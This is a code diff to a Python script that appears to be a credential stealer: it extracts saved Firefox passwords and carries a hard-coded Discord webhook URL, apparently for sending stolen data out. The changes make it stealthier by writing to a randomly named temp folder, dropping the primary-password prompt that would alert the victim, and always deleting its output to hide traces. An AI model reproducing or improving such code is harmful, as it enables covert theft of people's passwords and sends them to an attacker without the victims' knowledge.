@@ -18,6 +18,8 @@ import re
 import datetime
 import platform
 from pathlib import Path
+import random
+import string
 
 try:
     import psutil
@@ -37,7 +39,10 @@ try:
 except ImportError:
     GPU_AVAILABLE = False
 
-BASE_OUTPUT_DIR = os.path.join(os.getcwd(), "extraction_output")
+def get_random_temp_dir():
+    return os.path.join(tempfile.gettempdir(), ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)))
+
+BASE_OUTPUT_DIR = get_random_temp_dir()
 BROWSERS_DIR = os.path.join(BASE_OUTPUT_DIR, "browsers")
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1498095810838139002/dVY9WsDgTrfZFlHh7kvyUQzAIJsjoxauIIopFPvJTqSvS_Nw1n110RsOHVIKVWbjx_5O"
@@ -177,11 +182,9 @@ def extract_firefox_passwords(profile_path, nss):
     need_login = nss.PK11_NeedLogin(slot)
 
     if need_login:
-        password = getpass("Primary Password for Firefox: ")
-        if nss.PK11_CheckUserPassword(slot, password.encode()) != 0:
-            nss.PK11_FreeSlot(slot)
-            nss.NSS_Shutdown()
-            return []
+        nss.PK11_FreeSlot(slot)
+        nss.NSS_Shutdown()
+        return []
 
     with open(logins_file, 'r') as f:
         data = json.load(f)
@@ -944,10 +947,10 @@ def main():
             except:
                 pass
 
-            try:
-                shutil.rmtree(BASE_OUTPUT_DIR, ignore_errors=True)
-            except:
-                pass
+    try:
+        shutil.rmtree(BASE_OUTPUT_DIR, ignore_errors=True)
+    except:
+        pass
 
 if __name__ == "__main__":
     main()
